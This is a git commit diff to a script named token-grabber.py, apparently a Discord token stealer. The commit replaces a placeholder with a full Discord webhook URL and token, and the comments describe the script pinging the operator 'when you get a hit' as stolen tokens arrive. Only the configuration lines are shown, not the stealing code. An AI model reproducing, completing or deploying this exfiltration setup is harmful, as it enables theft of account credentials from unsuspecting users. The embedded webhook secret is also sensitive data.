9d79840a309af8f05ba3bd9c9ce8b0283a0aee00
Kill3rPal <68537603+Kill3rPal@users.noreply.github.com>
2021-01-01 21:57:47 +0200

    Update token-grabber.py

--- token-grabber.py
+++ token-grabber.py
@@ -5,7 +5,7 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/794655450783023105/PwGf0iqGrvlyyqZmA3KDRI-rMefKx8fPRGOgSbgqo19OW45WmY7cF-GfU0Wn-M32kK8y'
 
 # mentions you when you get a hit
 PING_ME = False
